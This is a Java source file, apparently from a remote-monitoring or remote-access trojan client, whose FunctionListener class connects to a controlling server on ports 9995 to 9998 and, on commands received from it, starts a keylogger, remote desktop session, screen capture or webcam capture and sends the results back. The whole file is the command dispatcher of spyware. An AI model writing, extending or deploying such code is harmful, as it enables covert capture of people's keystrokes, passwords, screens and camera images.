package Client;

import java.io.DataInputStream;
import java.io.IOException;
import java.net.Socket;

//imports user defined package
import Client.Keylogger.Keylogger;
import Client.RemoteClient.*;
import Client.Screenshot.CaptureScreen;
import Client.Webcam.CaptureCam;

/*
 * class Name: FunctionListener
 * This class creates a thread which listen to all the instruction send by
 * the server and performs the function.
 * 
 * This thread uses port "9999" to receive and send data to server. 
 */
class FunctionListener extends Thread {

	Socket socket;
	Socket remoteSocket;
	Socket webcamSocket;
	Socket screenshotSocket;
	Socket keyloggerSocket;

	DataInputStream receiveData;

	String receiveFunction;
	String ipAddress;

	ClientRemoteSetup classRemoteClient;
	CaptureCam classWebcamClient;
	CaptureScreen classScreenshotClient;
	Keylogger classKeyloggerClient;

	/*
	 * Constructor of the class FunctionListner.
	 * 
	 * Parameters: ipAddress,socket
	 * 
	 * Parameter Type: ipAddress -> String, socket ->Socket
	 * 
	 * Functionality:Creates a Socket Connection of the objects.
	 */

	FunctionListener(String ipAddress, Socket socket) {
		this.ipAddress = ipAddress;
		try {
			Thread.sleep(2000);

			// Remote Monitoring Feature uses port "9998" to interact to server
			remoteSocket = new Socket(ipAddress, 9998);

			// Webcam Feature uses port "9997" to interact to server
			webcamSocket = new Socket(ipAddress, 9997);

			// Screen Screenshot Feature uses port "9996" to interact to server
			screenshotSocket = new Socket(ipAddress, 9996);

			// Keylogger Feature uses port "9995" to interact to server
			keyloggerSocket = new Socket(ipAddress, 9995);

		} catch (IOException | InterruptedException e) {

			e.printStackTrace();
		}
		this.socket = socket;
		this.start();
	}

	/*
	 * Runs the thread. Displays the action to be performed which recieves the
	 * operation in the form of Button click from the server.
	 */

	public void run() {

		// try block to capture Exception that may be caused while calling thread
		try {
			receiveData = new DataInputStream(socket.getInputStream());

			while (true) {

				// receives the action from the server that need be performed on the client side
				receiveFunction = (String) receiveData.readUTF();

				switch (receiveFunction) {

					// action when Remote Desktop feature is turned on
					case "btnRemoteOn":
						classRemoteClient = new ClientRemoteSetup(remoteSocket);
						classRemoteClient.start();
						break;

					// action when Remote Desktop feature is turned of
					case "btnRemoteOff":
						classRemoteClient.close();
						break;

					// action when Keylogger feature is turned on
					case "btnKeyOn":
						classKeyloggerClient = new Keylogger(keyloggerSocket);
						classKeyloggerClient.start();
						break;

					// action when Keylogger feature is turned off
					case "btnKeyOff":
						classKeyloggerClient.close();
						break;

					// action taken when Screenshot feature is turned On
					case "btnScreenshot":
						classScreenshotClient = new CaptureScreen(screenshotSocket);
						classScreenshotClient.start();
						break;

					// action when Webcam is turned on
					case "btnWebcam":
						classWebcamClient = new CaptureCam(webcamSocket);
						classWebcamClient.start();
						break;

				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}